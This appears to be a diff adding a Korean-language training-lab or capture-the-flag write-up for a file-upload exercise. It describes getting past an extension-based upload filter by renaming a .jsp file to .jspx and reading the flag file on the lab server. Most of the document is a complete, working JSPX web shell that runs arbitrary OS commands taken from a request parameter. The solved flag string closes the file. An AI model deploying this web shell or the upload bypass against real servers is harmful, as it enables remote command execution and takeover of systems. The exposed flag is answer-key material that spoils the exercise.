@@ -1,0 +1,81 @@
+================================
+파일 업로드 6번
+1. 공격 과정
+     1-1) /common21/file/uploadFile.json의 files[] 파라미터를 통해 파일 업로드 시도
+     1-2) .jsp 확장자는 cvalue="F"로 차단되는 것을 확인
+     1-3) .txt 파일에 JSP 코드를 넣으면 업로드되는 것을 확인하여 파일 내용 검사는 하지 않고 확장자 기반으로 필터링하는 것을 확인
+     1-4) .jspx 확장자로 변경하여 업로드 우회 성공
+     1-5) 업로드 응답에서 저장된 JSPX 파일명 확인
+     1-6) 직접 접근하여 JSPX 실행 확인  (https://lab.eqst.co.kr:8441/data/files/qna/20261015/d2ebf6ba-9bf1-4a46-bde7-6de2cbe3a12c.jspx)
+     1-9) cat ./webapps/new_board/TO_DO.txt 명령으로 정답 획득
+
+2. 사용한 악성코드
+    <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
+    <jsp:directive.page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"/>
+    <jsp:directive.page import="java.io.*"/>
+    <jsp:scriptlet>
+        <![CDATA[
+        request.setCharacterEncoding("UTF-8");
+        response.setContentType("text/html; charset=UTF-8");
+        String c = request.getParameter("cmd");
+        ]]>
+    </jsp:scriptlet>
+<html>
+<head>
+<meta charset="UTF-8"/>
+<title>Web Shell</title>
+</head>
+<body>
+<form method="GET" name="f">
+    <input type="text" name="cmd" size="50" value="${param.cmd}"/>
+    <input type="submit" value="전송"/>
+</form>
+<hr/>
+<pre>
+<jsp:scriptlet>
+<![CDATA[
+if (c != null && !c.trim().isEmpty()) {
+    out.println("cmd : " + c + "\n");
+    try {
+        Process p;
+        String o = System.getProperty("os.name").toLowerCase();
+        if (o.contains("win")) {
+            p = Runtime.getRuntime().exec(new String[]{"cmd.exe", "/c", c});
+        } else {
+            p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", c});
+        }
+        String e = o.contains("win") ? "MS949" : "UTF-8";
+        BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream(), e));
+        BufferedReader er = new BufferedReader(new InputStreamReader(p.getErrorStream(), e));
+        String l;
+        boolean b = false;
+        while ((l = r.readLine()) != null) {
+            out.println(l);
+            b = true;
+        }
+        while ((l = er.readLine()) != null) {
+            out.println(l);
+            b = true;
+        }
+        if (!b) {
+            out.println("[Done]");
+        }
+        r.close();
+        er.close();
+    } catch (Exception ex) {
+        out.println("[Error] " + ex.getMessage());
+    }
+}
+]]>
+</jsp:scriptlet>
+</pre>
+</body>
+</html>
+</jsp:root>
+
+  </jsp:root>
+3. 정답
+     jspx_is_too_bad
+ 
+
+================================
